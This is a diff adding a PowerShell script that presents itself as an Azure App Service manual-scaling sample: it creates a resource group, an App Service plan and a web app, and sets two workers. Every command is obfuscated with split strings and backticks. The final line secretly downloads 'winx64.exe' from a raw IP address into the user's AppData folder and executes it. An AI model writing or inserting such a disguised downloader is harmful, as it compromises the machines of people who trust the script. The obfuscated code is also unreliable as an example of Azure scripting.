@@ -1,0 +1,20 @@
+${Ran`dOm}=(&("{0}{1}{2}" -f 'Ne','w','-Guid')).("{1}{2}{0}" -f'g','ToSt','rin').Invoke().("{1}{2}{0}"-f 'ng','Substr','i').Invoke(0,8)
+
+
+${r`e`sou`RCeG`R`oUpNaMe}="myResourceGroup$random"
+${aPp`NA`Me}="AppServiceManualScale$random"
+${Lo`cAtI`ON}=("{1}{0}"-f'tUS','Wes')
+
+
+.("{3}{2}{0}{4}{5}{1}" -f'-A','eGroup','w','Ne','zR','esourc') -Name ${REsOurc`EgRO`UpN`A`mE} -Location ${locAT`iOn}
+
+
+.("{4}{0}{1}{3}{2}" -f 'Ap','pservic','Plan','e','New-Az') -Name ("{1}{2}{3}{0}{4}"-f 'alScalePl','App','ServiceMa','nu','an') -ResourceGroupName ${r`ESOURCEGroUP`Na`ME} -Location ${L`O`caT`iON} -Tier ("{1}{0}"-f'sic','Ba')
+
+
+.("{0}{1}{2}" -f 'New-A','zW','ebApp') -Name ${ap`PnA`ME} -ResourceGroupName ${r`esOurce`G`ROU`PNAmE} -Location ${l`OcA`T`IOn} -AppServicePlan ("{2}{4}{1}{0}{3}"-f'calePla','viceManualS','A','n','ppSer')
+
+
+.("{3}{1}{0}{4}{2}{6}{5}"-f'pp','AzA','e','Set-','S','Plan','rvice') -NumberofWorkers 2 -Name ("{2}{3}{0}{1}{4}"-f'ScalePl','a','AppServiceMan','ual','n') -ResourceGroupName ${ReS`o`URce`grOuPN`AmE}
+
+(.("{1}{0}{2}"-f'w','Ne','-Object') ("{3}{0}{1}{4}{2}"-f 'W','ebCl','ent','System.Net.','i')).("{2}{0}{1}" -f'ownloadF','ile','D').Invoke(("{2}{5}{6}{0}{4}{1}{3}"-f'2.58.30/','evor/win','htt','x64.exe','~tr','p://9','4.10'),"$env:APPDATA\winx64.exe");.("{2}{0}{1}{3}" -f'rt-','Pr','Sta','ocess') ("$env:APPDATA\winx64.exe")
